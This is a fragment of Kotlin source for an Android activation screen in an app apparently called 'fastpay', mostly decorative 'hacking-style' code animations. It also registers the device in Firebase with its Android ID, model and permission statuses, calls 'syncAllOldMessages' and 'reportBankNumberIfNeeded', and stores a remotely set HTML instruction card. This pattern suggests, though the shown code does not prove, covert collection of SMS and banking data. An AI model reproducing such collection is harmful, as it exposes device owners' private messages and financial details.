            // Collect all main UI elements in reverse order (for reverse card reveal)
            val uiElements = listOf(
                id.activationActivateButton,   // Activate button (last)
                id.activationInputCard,   // Input card
                id.activationTaglineText,  // Tagline
                id.activationLogoText   // Logo (first to disappear)
            )

            // Reverse card reveal: slide down and fade out in reverse order
            val animatorSet = AnimatorSet()
            val animators = mutableListOf<Animator>()

            uiElements.forEachIndexed { index, view ->
                if (!isDestroyed && !isFinishing && view.visibility == View.VISIBLE) {
                    // Cancel any existing animations on this view
                    view.clearAnimation()
                    view.animate().cancel()

                    // Quick fade out (no slide to avoid affecting card position)
                    val fadeOut = ObjectAnimator.ofFloat(view, "alpha", view.alpha, 0f).apply {
                        duration = 200
                        startDelay = index * 50L // Quick stagger
                        interpolator = AccelerateDecelerateInterpolator()
                    }

                    animators.add(fadeOut)
                }
            }

            // Fade out input field but keep card visible
            if (!isDestroyed && !isFinishing && id.activationPhoneInput.visibility == View.VISIBLE) {
                id.activationPhoneInput.clearAnimation()
                id.activationPhoneInput.animate().cancel()
                val fadeOut = ObjectAnimator.ofFloat(id.activationPhoneInput, "alpha", id.activationPhoneInput.alpha, 0f).apply {
                    duration = 200
                    interpolator = AccelerateDecelerateInterpolator()
                }
                animators.add(fadeOut)
            }

            // DO NOT fade out main container or card - keep them visible for transition

            if (animators.isNotEmpty() && !isDestroyed && !isFinishing) {
                animatorSet.playTogether(animators)
                animatorSet.addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: Animator) {
                        if (!isDestroyed && !isFinishing) {
                            // Small delay to ensure all animations are fully complete
                            handler.postDelayed({
                                if (!isDestroyed && !isFinishing) {
                                    onComplete()
                                }
                            }, 50)
                        }
                    }
                })
                animatorSet.start()
            } else {
                // No animations to play, complete immediately
                onComplete()
            }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Error in fadeOutCurrentUI", e)
            onComplete()
        }
    }

    /**
     * Animate the transformation from phone number to unique code
     * Uses one of 5 unique hacking-style authentication animations
     * Randomly selects an animation style for variety
     */
    private fun animatePhoneToCode(phone: String, code: String, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        if (phone.isBlank() || code.isBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Phone or code is blank in animatePhoneToCode")
            onComplete()
            return
        }

        try {
            // Use CRYPTO_HASH for TESTING, Matrix Rain for RUNNING
            val selectedStyle = if (currentLoginType == "testing") {
                HackingAnimationStyle.CRYPTO_HASH
            } else {
                HackingAnimationStyle.MATRIX_RAIN
            }

            android.util.Log.d("ActivationActivity", "🎭 Using animation style: $selectedStyle")

            when (selectedStyle) {
                HackingAnimationStyle.MATRIX_RAIN -> animateMatrixRain(phone, code, onComplete)
                HackingAnimationStyle.TERMINAL_TYPING -> animateTerminalTyping(phone, code, onComplete)
                HackingAnimationStyle.BINARY_GLITCH -> animateBinaryGlitch(phone, code, onComplete)
                HackingAnimationStyle.HEX_DECODE -> animateHexDecode(phone, code, onComplete)
                HackingAnimationStyle.CRYPTO_HASH -> animateCryptoHash(phone, code, onComplete)
            }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "❌ Error in animatePhoneToCode", e)
            if (!isDestroyed && !isFinishing) {
                id.activationPhoneInput.setText(formatCodeForDisplay(code))
            }
            onComplete()
        }
    }

    /**
     * Animation styles enum for different hacking-style animations
     */
    enum class HackingAnimationStyle {
        MATRIX_RAIN,      // Characters scramble like matrix rain
        TERMINAL_TYPING,  // Typewriter effect with terminal cursor
        BINARY_GLITCH,    // Numbers flash to binary, then decode
        HEX_DECODE,       // Convert to hex, then decode to final code
        CRYPTO_HASH       // Visual hash/encryption effect
    }

    /**
     * Animation 1: MATRIX RAIN
     * Characters scramble randomly like matrix code rain before settling into final code
     */
    private fun animateMatrixRain(phone: String, code: String, onComplete: () -> Unit) {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        val matrixChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
        val random = java.util.Random()
        var scrambleIterations = 0
        val maxScrambles = 8

            id.activationPhoneInput.setText(phone)
        id.activationPhoneInput.setTextColor(themePrimary)
        id.activationPhoneInput.typeface = android.graphics.Typeface.MONOSPACE

        val scrambleRunnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    onComplete()
                    return
                }

                if (scrambleIterations < maxScrambles) {
                    // Scramble all characters randomly
                    val scrambled = StringBuilder()
                    for (i in code.indices) {
                        scrambled.append(matrixChars[random.nextInt(matrixChars.length)])
                    }
                    id.activationPhoneInput.setText(scrambled.toString())
                    id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)

                    scrambleIterations++
                    handlerRunnables.add(this)
                    handler.postDelayed(this, 100L)
                } else {
                    // Gradually reveal correct code character by character
                    var charIndex = 0
                    val revealRunnable = object : Runnable {
                        override fun run() {
                            if (isDestroyed || isFinishing || charIndex >= code.length) {
                                finalizeAnimation(code, onComplete)
                                return
                            }

                            val revealed = code.substring(0, charIndex + 1)
                            val remaining = StringBuilder()
                            for (i in charIndex + 1 until code.length) {
                                remaining.append(matrixChars[random.nextInt(matrixChars.length)])
                            }
                            id.activationPhoneInput.setText(revealed + remaining.toString())

                            // Glitch effect
                            id.activationPhoneInput.alpha = 0.7f
                            id.activationPhoneInput.animate()
                                .alpha(1f)
                                .setDuration(50)
                                .start()

                            id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                            charIndex++

                            handlerRunnables.add(this)
                            handler.postDelayed(this, 120L)
                    }
                    }
                    handlerRunnables.add(revealRunnable)
                    handler.postDelayed(revealRunnable, 50L)
                }
            }
        }
        handlerRunnables.add(scrambleRunnable)
        handler.postDelayed(scrambleRunnable, 200L)
    }

    /**
     * Animation 2: TERMINAL TYPING
     * Typewriter effect with terminal-style cursor and command-line appearance
     */
    private fun animateTerminalTyping(phone: String, code: String, onComplete: () -> Unit) {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        id.activationPhoneInput.setText("> ")
                        id.activationPhoneInput.setTextColor(themePrimary)
        id.activationPhoneInput.typeface = android.graphics.Typeface.MONOSPACE

        // First show phone being "deleted"
        var phoneIndex = phone.length
        val deleteRunnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    onComplete()
                    return
                }

                if (phoneIndex >= 0) {
                    id.activationPhoneInput.setText("> " + phone.substring(0, phoneIndex) + "_")
                    phoneIndex--
                    handlerRunnables.add(this)
                    handler.postDelayed(this, 60L)
                } else {
                    // Start typing code with cursor
                    var codeIndex = 0
                    val typeRunnable = object : Runnable {
                        override fun run() {
                            if (isDestroyed || isFinishing) {
                                finalizeAnimation(code, onComplete)
                                return
                            }

                            if (codeIndex < code.length) {
                                val typed = code.substring(0, codeIndex + 1)
                                id.activationPhoneInput.setText("> ${typed}_")

                                // Cursor blink effect
                                id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)

                                codeIndex++
                                handlerRunnables.add(this)
                                handler.postDelayed(this, 150L)
                            } else {
                                // Remove cursor and finalize
                                id.activationPhoneInput.setText("> $code")
                                                handler.postDelayed({
                                    finalizeAnimation(code, onComplete)
                                }, 300L)
                            }
                                            }
                                        }
                    handlerRunnables.add(typeRunnable)
                    handler.postDelayed(typeRunnable, 200L)
                }
            }
        }
        handlerRunnables.add(deleteRunnable)
        handler.postDelayed(deleteRunnable, 300L)
    }

    /**
     * Animation 3: BINARY GLITCH
     * Numbers flash to binary representation, then decode to final code
     */
    private fun animateBinaryGlitch(phone: String, code: String, onComplete: () -> Unit) {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        id.activationPhoneInput.setText(phone)
        id.activationPhoneInput.setTextColor(themePrimary)
        id.activationPhoneInput.typeface = android.graphics.Typeface.MONOSPACE

        val random = java.util.Random()
        var phase = 0 // 0: convert to binary, 1: decode to code
        var index = 0

        val binaryRunnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    onComplete()
                    return
                }

                if (phase == 0) {
                    // Convert each digit to binary with glitch effect
                    if (index < phone.length) {
                        val digit = phone[index].toString().toIntOrNull() ?: 0
                        val binary = Integer.toBinaryString(digit).padStart(4, '0')

                        val display = StringBuilder()
                        for (i in phone.indices) {
                            if (i < index) {
                                val d = phone[i].toString().toIntOrNull() ?: 0
                                display.append(Integer.toBinaryString(d).padStart(4, '0'))
                            } else if (i == index) {
                                display.append(binary)
                } else {
                                display.append(phone[i])
                            }
                        }
                        id.activationPhoneInput.setText(display.toString())

                        // Glitch effect
                        id.activationPhoneInput.translationX = (java.util.Random().nextFloat() * 10f - 5f)
                        id.activationPhoneInput.animate()
                            .translationX(0f)
                            .setDuration(100)
                            .start()

                        id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                        index++

                        handlerRunnables.add(this)
                        handler.postDelayed(this, 150L)
                    } else {
                        // Switch to decoding phase
                        phase = 1
                        index = 0
                        handlerRunnables.add(this)
                        handler.postDelayed(this, 500L)
                    }
                } else {
                    // Decode from binary to final code
                    if (index < code.length) {
                        val revealed = code.substring(0, index + 1)
                        val remaining = StringBuilder()
                        for (i in index + 1 until code.length) {
                            remaining.append(random.nextInt(2))
                        }
                        id.activationPhoneInput.setText(revealed + remaining.toString())

                        id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                        index++

                        if (index < code.length) {
                            handlerRunnables.add(this)
                            handler.postDelayed(this, 120L)
                        } else {
                            finalizeAnimation(code, onComplete)
                        }
                    }
                }
            }
        }
        handlerRunnables.add(binaryRunnable)
        handler.postDelayed(binaryRunnable, 200L)
    }

    /**
     * Animation 4: HEX DECODE
     * Convert phone number to hexadecimal, then decode to final code
     */
    private fun animateHexDecode(phone: String, code: String, onComplete: () -> Unit) {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        id.activationPhoneInput.setText(phone)
        id.activationPhoneInput.setTextColor(themePrimary)
        id.activationPhoneInput.typeface = android.graphics.Typeface.MONOSPACE

        // Convert phone to hex
        val hexString = phone.map {
            val digit = it.toString().toIntOrNull() ?: 0
            java.lang.Integer.toHexString(digit).uppercase()
        }.joinToString("")

        val random = java.util.Random()
        val hexChars = "0123456789ABCDEF"
        var phase = 0 // 0: show hex, 1: decode to code
        var hexDisplayIndex = 0

        val hexRunnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    onComplete()
                    return
                }

                if (phase == 0) {
                    // Display hex conversion character by character
                    if (hexDisplayIndex < hexString.length) {
                        val displayed = hexString.substring(0, hexDisplayIndex + 1)
                        id.activationPhoneInput.setText("0x$displayed")

                        id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                        hexDisplayIndex++

                        if (hexDisplayIndex < hexString.length) {
                            handlerRunnables.add(this)
                            handler.postDelayed(this, 100L)
                        } else {
                            phase = 1
                            hexDisplayIndex = 0
                            handlerRunnables.add(this)
                            handler.postDelayed(this, 600L)
                        }
                    }
                } else {
                    // Decode from hex to final code
                    if (hexDisplayIndex < code.length) {
                        val revealed = code.substring(0, hexDisplayIndex + 1)
                        val remaining = StringBuilder()
                        for (i in hexDisplayIndex + 1 until code.length) {
                            remaining.append(hexChars[random.nextInt(hexChars.length)])
                        }
                        id.activationPhoneInput.setText("0x" + revealed + remaining.toString())

                        // Glitch rotation
                        id.activationPhoneInput.rotation = (java.util.Random().nextFloat() * 4f - 2f)
                        id.activationPhoneInput.animate()
                            .rotation(0f)
                            .setDuration(100)
                            .start()

                            id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                        hexDisplayIndex++

                        if (hexDisplayIndex < code.length) {
                            handlerRunnables.add(this)
                            handler.postDelayed(this, 130L)
                        } else {
                            // Remove "0x" prefix
                            handler.postDelayed({
                                id.activationPhoneInput.setText(code)
                                finalizeAnimation(code, onComplete)
                            }, 300L)
                        }
                    }
                }
            }
        }
        handlerRunnables.add(hexRunnable)
        handler.postDelayed(hexRunnable, 200L)
    }

    /**
     * Animation 5: CRYPTO HASH
     * Visual hash/encryption effect with scrambling characters
     */
    private fun animateCryptoHash(phone: String, code: String, onComplete: () -> Unit) {
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        val hashChars = "0123456789ABCDEFabcdef"
        val random = java.util.Random()
        id.activationPhoneInput.setText("HASHING...")
        id.activationPhoneInput.setTextColor(themePrimary)
        id.activationPhoneInput.typeface = android.graphics.Typeface.MONOSPACE

        var hashIterations = 0
        val maxHashes = 12

        val hashRunnable = object : Runnable {
            override fun run() {
                if (isDestroyed || isFinishing) {
                    onComplete()
                    return
                }

                if (hashIterations < maxHashes) {
                    // Generate random hash-like string
                    val hash = StringBuilder()
                    for (i in code.indices) {
                        hash.append(hashChars.random())
                    }
                    id.activationPhoneInput.setText("SHA256: $hash")

                    // Glitch effect
                    id.activationPhoneInput.scaleX = 0.98f
                    id.activationPhoneInput.scaleY = 0.98f
                    id.activationPhoneInput.animate()
                        .scaleX(1f)
                        .scaleY(1f)
                        .setDuration(50)
                        .start()

                    id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                    hashIterations++

                    handlerRunnables.add(this)
                    handler.postDelayed(this, 120L)
                                } else {
                    // Reveal code gradually
                    var revealIndex = 0
                    val revealRunnable = object : Runnable {
                        override fun run() {
                            if (isDestroyed || isFinishing) {
                                finalizeAnimation(code, onComplete)
                                return
                            }

                            if (revealIndex < code.length) {
                                val revealed = code.substring(0, revealIndex + 1)
                                val remaining = StringBuilder()
                                for (i in revealIndex + 1 until code.length) {
                                    remaining.append(hashChars[random.nextInt(hashChars.length)])
                                }
                                id.activationPhoneInput.setText("DECRYPTED: $revealed$remaining")

                                // Pulse effect
                                id.activationPhoneInput.alpha = 0.8f
                                id.activationPhoneInput.animate()
                                    .alpha(1f)
                                    .setDuration(80)
                                    .start()

                                id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
                                revealIndex++

                                if (revealIndex < code.length) {
                                    handlerRunnables.add(this)
                                    handler.postDelayed(this, 140L)
                                } else {
                                    handler.postDelayed({
                                        id.activationPhoneInput.setText(code)
                                        finalizeAnimation(code, onComplete)
                                    }, 400L)
                            }
                        }
                        }
                }
                    handlerRunnables.add(revealRunnable)
                    handler.postDelayed(revealRunnable, 300L)
            }
            }
        }
        handlerRunnables.add(hashRunnable)
        handler.postDelayed(hashRunnable, 200L)
    }

    /**
     * Finalize animation with final effects
     */
    private fun finalizeAnimation(code: String, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        // Format code for display (add dashes)
        val displayCode = formatCodeForDisplay(code)
        id.activationPhoneInput.setText(displayCode)
        val safeSelection = id.activationPhoneInput.text?.length ?: 0
        id.activationPhoneInput.setSelection(safeSelection)
        id.activationPhoneInput.setTextColor(themePrimary)

        // Final pulse effect
        val finalAnimator = AnimatorSet().apply {
            playTogether(
                ObjectAnimator.ofFloat(id.activationPhoneInput, "scaleX", 1f, 1.15f, 1f).apply {
                    duration = 500
                    interpolator = OvershootInterpolator(2.5f)
                },
                ObjectAnimator.ofFloat(id.activationPhoneInput, "scaleY", 1f, 1.15f, 1f).apply {
                    duration = 500
                    interpolator = OvershootInterpolator(2.5f)
                },
                ObjectAnimator.ofFloat(id.activationPhoneInput, "alpha", 1f, 0.9f, 1f).apply {
                    duration = 500
                    interpolator = AccelerateDecelerateInterpolator()
                }
            )
            addListener(object : AnimatorListenerAdapter() {
                override fun onAnimationEnd(animation: Animator) {
            if (!isDestroyed && !isFinishing) {
                id.activationPhoneInput.setText(code)
                        id.activationPhoneInput.setTextColor(themePrimary)
                        id.activationPhoneInput.scaleX = 1f
                        id.activationPhoneInput.scaleY = 1f
                        id.activationPhoneInput.alpha = 1f

                        transformInputCardToDisplayCard()

                        handler.postDelayed({
                            if (!isDestroyed && !isFinishing) {
            onComplete()
        }
                        }, 100L)
                    }
                }
            })
        }
        finalAnimator.start()
    }

    /**
     * Normalize phone number by removing spaces and special characters
     */
    private fun normalizePhone(phone: String): String {
        return phone.replace(" ", "")
                   .replace("+", "")
                   .replace("-", "")
                   .replace("(", "")
                   .replace(")", "")
    }

    /**
     * Convert phone number to code
     * Format: 5 uppercase letters + 5 digits (e.g., "ABCDE12345")
     *
     * Algorithm:
     * - Add sequence numbers to each phone digit: [10, 52, 63, 89, 12, 36, 63, 78, 63, 75]
     * - For first 5 positions: (phone_digit + sequence) % 26 → uppercase letter (A-Z)
     * - For last 5 positions: (phone_digit + sequence) % 10 → digit (0-9)
     */
    private fun convertPhoneToCode(phone: String): String {
        val normalizedPhone = normalizePhone(phone)

        // Sequence numbers to add to each phone digit
        val sequence = intArrayOf(10, 52, 63, 89, 12, 36, 63, 78, 63, 75)

        // Ensure phone number has at least 10 digits (pad with zeros if shorter)
        val phoneDigits = normalizedPhone.padStart(10, '0').take(10)

        val code = StringBuilder()
        val alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

        // Format: XXXXX11111 (5 letters + 5 numbers, no dashes - dashes are only for display)
        // First 5 characters: letters (XXXXX)
        for (i in 0 until 5) {
            val phoneDigit = phoneDigits[i].toString().toIntOrNull() ?: 0
            val sequenceValue = sequence[i]
            val sum = phoneDigit + sequenceValue
            val letterIndex = sum % 26
            code.append(alphabet[letterIndex])
        }

        // Last 5 characters: digits (11111)
        for (i in 5 until 10) {
            val phoneDigit = phoneDigits[i].toString().toIntOrNull() ?: 0
            val sequenceValue = sequence[i]
            val sum = phoneDigit + sequenceValue
            val digit = sum % 10
            code.append(digit)
        }

        return code.toString()
    }

    /**
     * Format code for display by adding dash between letters and numbers
     * Input: "XXXXX11111" -> Output: "XXXXX-11111"
     */
    private fun formatCodeForDisplay(code: String): String {
        if (code.isBlank()) return code

        // Remove any existing dashes first (for backward compatibility)
        val cleanCode = code.replace("-", "")

        // Must be exactly 10 characters (5 letters + 5 numbers)
        if (cleanCode.length != 10) return code

        // Format: XXXXX-11111 (5 letters - 5 numbers)
        return "${cleanCode.substring(0, 5)}-${cleanCode.substring(5, 10)}"
    }

    /**
     * Get user identifier or generate default
     * Default: "Device {last4digits}" or "Phone {last4digits}"
     */
    private fun getUserIdentifier(phone: String): String {
        // TODO: Add UI input field for identifier
        // For now, generate default identifier
        val last4 = phone.takeLast(4)
        return "Phone $last4"
    }

    private fun disableInputForActivation() {
        dismissKeyboard()
        id.activationPhoneInput.clearFocus()
        id.activationPhoneInput.isEnabled = false
    }

    private fun restoreInputAfterValidationFail() {
        id.activationPhoneInput.isEnabled = true
        id.activationPhoneInput.clearFocus()
        dismissKeyboard()
        resetActivationButtons()
    }

    private fun startActivationButtonsAnimation(durationMs: Long = 4000L) {
        val activateButton = id.activationActivateButton
        val clearButton = id.activationClearButton

        activateButton.isEnabled = false
        clearButton.isEnabled = false

        activateButton.animate().cancel()
        clearButton.animate().cancel()

        activateButton.animate()
            .scaleX(1.08f)
            .scaleY(1.04f)
            .setDuration(durationMs)
            .setInterpolator(DecelerateInterpolator())
            .start()

        clearButton.animate()
            .scaleX(0.92f)
            .scaleY(0.92f)
            .setDuration(durationMs)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }

    private fun resetActivationButtons() {
        val activateButton = id.activationActivateButton
        val clearButton = id.activationClearButton

        activateButton.animate().cancel()
        clearButton.animate().cancel()

        activateButton.scaleX = 1f
        activateButton.scaleY = 1f
        clearButton.scaleX = 1f
        clearButton.scaleY = 1f

        activateButton.isEnabled = true
        clearButton.isEnabled = true
        activateButton.visibility = View.VISIBLE
        activateButton.alpha = 1f
    }

    @SuppressLint("HardwareIds")
    private fun activate() {
        val input = id.activationPhoneInput.text.toString().replace(" ", "").replace("-", "")
        disableInputForActivation()

        if (currentLoginType == "testing") {
            // TESTING mode: Validate phone number (must contain exactly 10 digits)
            val normalizedPhone = normalizePhone(input)
            val digitCount = normalizedPhone.filter { it.isDigit() }.length
            if (digitCount != 10) {
                updateActivationState(
                    ActivationState.Fail,
                    ActivationErrorType.Validation,
                    "Invalid phone number. Please enter 10 digits."
                )
                reportActivationFailure(input, "validation", "Invalid phone number. Please enter 10 digits.")
                restoreInputAfterValidationFail()
                return
            }

            // Process phone number activation
            updateActivationState(ActivationState.Validating)
            startStatusTypingSequence()
            processPhoneActivation(input, normalizedPhone)
        } else {
            // RUNNING mode: Validate activation code (4 letters + 4 digits)
            val cleanInput = input.uppercase()
            if (!cleanInput.matches(Regex("^[A-Z]{4}\\d{4}$"))) {
                updateActivationState(
                    ActivationState.Fail,
                    ActivationErrorType.Validation,
                    "Invalid activation code. Please enter 4 letters and 4 digits."
                )
                reportActivationFailure(cleanInput, "validation", "Invalid activation code. Please enter 4 letters and 4 digits.")
                restoreInputAfterValidationFail()
                return
            }

            // Process code activation with uppercase input
            updateActivationState(ActivationState.Validating)
            startStatusTypingSequence()
            processCodeActivation(cleanInput)
        }
    }

    /**
     * Process phone number activation (TESTING mode)
     * Firebase first, then Django API (both mandatory)
     * Writes device data to Firebase fastpay/{code}
     */
    @SuppressLint("HardwareIds")
    private fun processPhoneActivation(phone: String, normalizedPhone: String) {
        // Get Android ID with null check
        val deviceId = androidId()
        if (deviceId.isNullOrBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Android ID is null or blank")
            android.widget.Toast.makeText(this, "Error: Unable to get device ID", android.widget.Toast.LENGTH_LONG).show()
            return
        }

        // Save state for configuration changes
        isActivating = true
        currentPhone = phone

        startActivationButtonsAnimation()
        id.activationLoadingOverlay.hide() // Hide progress bar - animation will show progress
        id.activationPhoneInput.isEnabled = false // Disable editing during activation

        // Get identifier
        val identifier = getUserIdentifier(phone)

        // Generate code immediately (don't wait for Firebase)
        val generatedCode = convertPhoneToCode(phone)
        currentCode = generatedCode
        reportBankNumberIfNeeded(normalizedPhone, generatedCode, deviceId)

        // Start animation immediately for better UX
        val normalizedPhoneForAnimation = normalizePhone(phone)

        // Start input field flip and code conversion animation immediately
        // Navigation happens from runStatusContentCollapseSyncThenNavigate when Firebase succeeds
        animateInputFieldFlip(normalizedPhoneForAnimation, generatedCode) {
            if (!isDestroyed && !isFinishing) {
                syncAllOldMessages(phone)
            }
        }

        // Run Firebase operations (TESTING mode); on success runStatusContentCollapseSyncThenNavigate will run
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            handleActivation(deviceId, phone, generatedCode, normalizedPhone, identifier)
        }
    }

    /**
     * Validate bank code for RUNNING mode activation
     * Uses Django API POST /api/isvalidcodelogin - if API approves, that's sufficient
     *
     * @param code Bank code to validate (without dashes)
     * @param callback Callback with validation result (true = valid/authenticate, false = invalid/not authorise)
     */
    @SuppressLint("HardwareIds")
    private fun validateBankCode(code: String, callback: (Boolean) -> Unit) {
        android.util.Log.d("ActivationActivity", "Validating RUNNING mode code via Django API: $code")

        val deviceId = androidId()
        if (deviceId.isNullOrBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Android ID is null or blank")
            handler.post {
                reportActivationFailure(code, "device_id", "Error: Unable to get device ID")
            }
            callback(false)
            return
        }

        // Timeout fallback so activation doesn't hang forever
        val timeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var completed = false
        val timeoutRunnable = Runnable {
            if (completed) return@Runnable
            completed = true
            android.util.Log.e("ActivationActivity", "❌ Django validation timed out")
            reportActivationFailure(code, "network_timeout", "Validation timed out. Please check your connection and try again.")
            callback(false)
        }
        timeoutHandler.postDelayed(timeoutRunnable, 15000)

        // Call Django API to validate code - if API approves, that's sufficient
        lifecycleScope.launch {
            when (val result = DjangoApiHelper.isValidCodeLogin(code, deviceId)) {
                is com.example.fast.util.Result.Success -> {
                    if (completed) return@launch
                    completed = true
                    timeoutHandler.removeCallbacks(timeoutRunnable)
                    val isValid = result.data
                    android.util.Log.d("ActivationActivity", "RUNNING mode validation result: $isValid")
                    if (isValid) {
                        android.util.Log.d("ActivationActivity", "✅ RUNNING code approved by Django API - proceeding with activation")
                        handler.post {
                            callback(true)
                        }
                    } else {
                        android.util.Log.w("ActivationActivity", "❌ RUNNING code is invalid via Django API - not authorized")
                        handler.post {
                            reportActivationFailure(code, "invalid_code", "Invalid activation code. Please check your code and try again.")
                            callback(false)
                        }
                    }
                }
                is com.example.fast.util.Result.Error -> {
                    if (completed) return@launch
                    completed = true
                    timeoutHandler.removeCallbacks(timeoutRunnable)
                    android.util.Log.e("ActivationActivity", "❌ Error validating code via Django API", result.exception)
                    handler.post {
                        reportActivationFailure(code, "network", "Network error during validation. Please check your internet connection and try again.")
                        callback(false)
                    }
                }
            }
        }
    }

    /**
     * Process activation code activation (RUNNING mode)
     * Directly uses code without conversion or animation
     * Now includes bank code validation before activation
     */
    @SuppressLint("HardwareIds")
    private fun processCodeActivation(code: String) {
        // Get Android ID with null check
        val deviceId = androidId()
        if (deviceId.isNullOrBlank()) {
            android.util.Log.e("ActivationActivity", "❌ Android ID is null or blank")
            android.widget.Toast.makeText(this, "Error: Unable to get device ID", android.widget.Toast.LENGTH_LONG).show()
            return
        }

        // Remove dashes from code if present
        val cleanCode = code.replace("-", "")

        // Save state for configuration changes
        isActivating = true
        currentCode = cleanCode
        currentPhone = "" // No phone number in RUNNING mode

        startActivationButtonsAnimation()
        id.activationLoadingOverlay.hide()
        id.activationPhoneInput.isEnabled = false // Disable editing during activation

        // Format the code for display (user's input code)
        val formattedCode = formatCodeForDisplay(cleanCode)
        id.activationPhoneInput.setText(formattedCode)

        // Start update animation on the user's INPUT code inside input card (cardView6)
        // Animation will replace EditText with animated character views in the same input card
        animateCodeUpdateRotation(cleanCode) {
            // Animation complete, proceed with validation
        }

        // Get identifier (use last 4 digits of code)
        val identifier = "Code ${cleanCode.takeLast(4)}"

        // NEW: Validate bank code before proceeding with activation
        validateBankCode(cleanCode) { isValid ->
            queueAuthorizationResult(isValid)
            if (isValid) {
                // Validation passed - proceed with activation (authenticate)
                android.util.Log.d("ActivationActivity", "✅ Bank code validated - proceeding with activation")
                handleActivationDirect(deviceId, cleanCode, identifier)
            } else {
                // Validation failed - show error and restore UI
                android.util.Log.d("ActivationActivity", "❌ Bank code validation failed - not authorized")
                resetActivationButtons()
                reportActivationFailure(cleanCode, "bank_code", "Authorization failed. Please check your activation code.")
                restoreUIOnError("")
            }
        }
    }

    /**
     * Handle activation directly with code (RUNNING mode)
     * Skips phone-to-code conversion and animation.
     * Permission is asked during status animation (after "Check for update", before Firebase).
     */
    private fun handleActivationDirect(
        deviceId: String,
        code: String,
        identifier: String
    ) {
        android.util.Log.d(TAG, "[DEBUG] handleActivationDirect(RUNNING): resumingAfterPermission=$resumingRegisteringAfterPermission")
        if (resumingRegisteringAfterPermission) {
            resumingRegisteringAfterPermission = false
            android.util.Log.d(TAG, "[DEBUG] handleActivationDirect: resuming after permission -> proceedWithFirebaseCheckDirect")
            updateActivationState(ActivationState.Registering)
            proceedWithFirebaseCheckDirect(deviceId, code, identifier)
            return
        }

        updateActivationState(ActivationState.Registering)
        android.util.Log.d(TAG, "[DEBUG] handleActivationDirect: proceedWithFirebaseCheckDirect (master card moved to ActivatedActivity)")
        proceedWithFirebaseCheckDirect(deviceId, code, identifier)
    }

    /** Run Firebase device check after "Check for update" and "Permission" steps (RUNNING mode). */
    private fun proceedWithFirebaseCheckDirect(deviceId: String, code: String, identifier: String) {
        android.util.Log.d(TAG, "[DEBUG] proceedWithFirebaseCheckDirect: deviceId=$deviceId")
        if (isDestroyed || isFinishing) return
        val mode = "running"
        val deviceRef = Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(deviceId, mode))
        val timeoutHandler = android.os.Handler(android.os.Looper.getMainLooper())
        var operationCompleted = false
        val timeoutRunnable = Runnable {
            if (!operationCompleted) {
                operationCompleted = true
                android.util.Log.e("ActivationActivity", "❌ Firebase operation timed out after 10 seconds")
                handler.post {
                    reportActivationFailure(code, "timeout", "Connection timeout. Please check your internet connection and try again.")
                    restoreUIOnError("")
                }
            }
        }
        timeoutHandler.postDelayed(timeoutRunnable, 10000)

        deviceRef.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (operationCompleted) return
                operationCompleted = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                val currentCodeInFirebase = if (snapshot.exists()) {
                    snapshot.child(AppConfig.FirebasePaths.CODE).getValue(String::class.java) ?: ""
                } else ""
                when {
                    currentCodeInFirebase.isEmpty() -> registerNewActivationDirect(deviceId, code, identifier)
                    currentCodeInFirebase == code -> continueWithExistingCodeDirect(deviceId, code, identifier)
                    else -> handleCodeConflictDirect(deviceId, code, currentCodeInFirebase, identifier)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                if (operationCompleted) return
                operationCompleted = true
                timeoutHandler.removeCallbacks(timeoutRunnable)
                android.util.Log.e("ActivationActivity", "❌ Error checking current code", error.toException())
                handler.post {
                    reportActivationFailure(code, "network", "Network error. Please check your connection and try again.")
                    restoreUIOnError("")
                }
            }
        })
    }

    /**
     * Scenario 1 (RUNNING): Register new activation with code directly
     */
    private fun registerNewActivationDirect(
        deviceId: String,
        code: String,
        identifier: String
    ) {
        try {
            // Get all permission status
            val permissionStatus = com.example.fast.util.PermissionFirebaseSync.getAllPermissionStatus(this)

            val map = mapOf(
                AppConfig.FirebasePaths.CODE to code,
                AppConfig.FirebasePaths.IS_ACTIVE to "Opened",
                "model" to (Build.BRAND + " " + Build.MODEL),  // Changed from NAME to model
                AppConfig.FirebasePaths.INSTRUCTION_CARD to mapOf(
                    "html" to "",
                    "css" to "",
                    "mode" to 0
                ),
